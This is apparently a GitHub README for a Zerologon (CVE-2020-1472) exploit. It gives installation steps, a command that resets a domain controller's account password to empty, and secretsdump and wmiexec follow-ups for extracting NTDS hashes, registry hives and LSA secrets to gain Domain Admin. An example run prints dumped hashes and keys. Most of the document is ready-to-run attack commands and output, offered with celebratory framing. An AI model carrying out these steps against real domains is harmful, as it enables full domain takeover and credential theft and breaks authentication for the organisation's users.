# CVE-2020-1472
Checker & Exploit Code for CVE-2020-1472 aka **Zerologon**

Tests whether a domain controller is vulnerable to the Zerologon attack, if vulnerable, it will resets the Domain Controller's account password to an empty string.

**NOTE:** It will likely break things in production environments (eg. DNS functionality, communication  with replication Domain Controllers, etc); target clients will then not be able to authenticate to the domain anymore, and they can only be re-synchronized through manual action. If you want to know more on how Zerologon attack break things, thanks to the awesome works of [@_dirkjan](https://twitter.com/_dirkjan), you can read it [**HERE**](https://threadreaderapp.com/thread/1306280553281449985.html)

Zerologon original research and whitepaper by Secura (Tom Tervoort) - [https://www.secura.com/blog/zero-logon](https://www.secura.com/blog/zero-logon)

[![asciicast](https://asciinema.org/a/359833.svg)](https://asciinema.org/a/359833)

# Exploit

It will attempt to perform the Netlogon authentication bypass. When a domain controller is patched, the detection script will give up after sending 2000 pairs of RPC calls, concluding that the target is not vulnerable (with a false negative chance of 0.04%).

The exploit will be successful only if the Domain Controller uses the password stored in Active Directory to validate the login attempt, rather than the one stored locally as, when changing a password in this way, it is only changed in the AD. The targeted system itself will still locally store its original password.

## Installation

Requires Python 3.7 or higher, virtualenv, pip and ~~a modified version of Impacket's library: nrpc.py (/impacket/dcerpc/v5)~~ the latest version of impacket from [GitHub](https://github.com/SecureAuthCorp/impacket) with added netlogon structures.

### 1. Install Impacket as follows:

1.	```git clone https://github.com/SecureAuthCorp/impacket```
2.	```cd impacket```
3.	```
	pwd 
	~/impacket/
	```
4.	```virtualenv --python=python3 impacket```
5.	```source impacket/bin/activate```
6.	```pip install --upgrade pip```
7.	```pip install .```

### 2. Install the Zerologon exploit script as follows:
1.	```pwd 
	~/impacket/
	```
2.	```cd examples```
3.	```git clone https://github.com/VoidSec/CVE-2020-1472```
4.	```cd CVE-2020-1472```
5.	```pip install -r requirements.txt```

## Running the script

The script can be used to target a DC or backup DC. It will likely also work against a read-only DC, but this has not been tested yet. 
The DC name should be its NetBIOS computer name. If this name is not correct, the script will likely fail with a `STATUS_INVALID_COMPUTER_NAME` error.
Given a domain controller named `EXAMPLE-DC` and IP address `1.2.3.4`, run the script as follows:

+    ```./cve-2020-1472-exploit.py -n EXAMPLE-DC -t 1.2.3.4```

Running the script should results in Domain Controller's account password being reset to an empty string.

At this point you should be able to run Impacket's ```secretsdump.py -no-pass -just-dc Domain/'DC_NETBIOS_NAME$'@DC_IP_ADDR``` (alternatively you can use the empty hash: ```-hashes :31d6cfe0d16ae931b73c59d7e0c089c0```) that will extract only NTDS.DIT data (NTLM hashes and Kerberos keys).

Which should get you Domain Admin. **WIN WIN WIN**

### Example Run
```
> cve-2020-1472-exploit.py -n WIN-U4Q9LLP6L2A -t 192.168.209.129
[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.

> secretsdump.py -no-pass -just-dc ad.test.com/WIN-U4Q9LLP6L2A\$@192.168.209.129
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

Restore:
> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe ad.test.com/Administrator@192.168.209.129
- reg save HKLM\SYSTEM system.save
- reg save HKLM\SAM sam.save
- reg save HKLM\SECURITY security.save
- get system.save
- get sam.save
- get security.save
- del /f system.save
- del /f sam.save
- del /f security.save

> secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
[*] Target system bootKey: 0x31f99ee2e750274d1fee930ab88fe126
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:ef464f4194d9f401af41c9982dc7c85524cc9ed8adef4fe24c8044d13f1ae41c594131d2d46cab3a0d3384cda94baae65d5a87d26df1201ff6ff1697672ac4e16c16f0e514f6e54d84342c5af4193fe96329e3a30fb84c08845e7a86dac4295276c7c2e3181555fa5eef21d4d1f469550f4706383327b299283f72b7df6b661cfb11189bd8b3ab552ffb99aa12ffe19b760e00e143ef3e776d8377da57925c5ed71aa9f0991acff7fc9c963addb8496fdd273f231e15a51d99f41a770de714573b26795c45a03eac80e3bb45ac5c100740da5814c3979e5349e8471623086c80f6160163f4bd56da3b75a6deb17b1020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9b5ccb9700e3ed723df08132357ff6a1
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xaf83406b2611f18ac99329079e9f47d9409e885f
dpapi_userkey:0x53ed555f11c110f918fc9a97a6c3576266930fb7
[*] NL$KM 
 0000   55 A7 DF DF 27 E2 64 C1  F7 42 F2 1B 96 76 01 4F   U...'.d..B...v.O
 0010   24 4C 5D 9B 20 E3 EA 95  DD E9 61 0F 00 8E B2 51   $L]. .....a....Q
 0020   B1 79 3F E0 37 3E CB B2  95 31 A6 74 F3 35 54 8A   .y?.7>...1.t.5T.
 0030   C1 B6 70 3D B3 AB AC C1  7E 8E 90 7A 7B 49 32 46   ..p=....~..z{I2F
NL$KM:55a7dfdf27e264c1f742f21b9676014f244c5d9b20e3ea95dde9610f008eb251b1793fe0373ecbb29531a674f335548ac1b6703db3abacc17e8e907a7b493246
[*] Cleaning up... 

> reinstall_original_pw.py WIN-U4Q9LLP6L2A 192.168.209.129 ef464f4194d9f401af41c9982dc7c85524cc9ed8adef4fe24c8044d13f1ae41c594131d2d46cab3a0d3384cda94baae65d5a87d26df1201ff6ff1697672ac4e16c16f0e514f6e54d84342c5af4193fe96329e3a30fb84c08845e7a86dac4295276c7c2e3181555fa5eef21d4d1f469550f4706383327b299283f72b7df6b661cfb11189bd8b3ab552ffb99aa12ffe19b760e00e143ef3e776d8377da57925c5ed71aa9f0991acff7fc9c963addb8496fdd273f231e15a51d99f41a770de714573b26795c45a03eac80e3bb45ac5c100740da5814c3979e5349e8471623086c80f6160163f4bd56da3b75a6deb17b1020
```

## Password Restore
**Reinstalling the original password hash is necessary for the DC to continue to operate normally.**

After you have obtained Domain Admin, you can ```wmiexec.py``` to the target DC with a credential obtained from secretsdump and perform the following steps:

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

Run: ```secretsdump.py -sam sam.save -system system.save -security security.save LOCAL```

And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by using the ```reinstall_original_pw.py``` script provided [here](https://github.com/risksense/zerologon/). Sometimes more than one run is needed before it succeed.
```
reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
```
Alternatively you can use following [restoration process](https://github.com/dirkjanm/CVE-2020-1472)

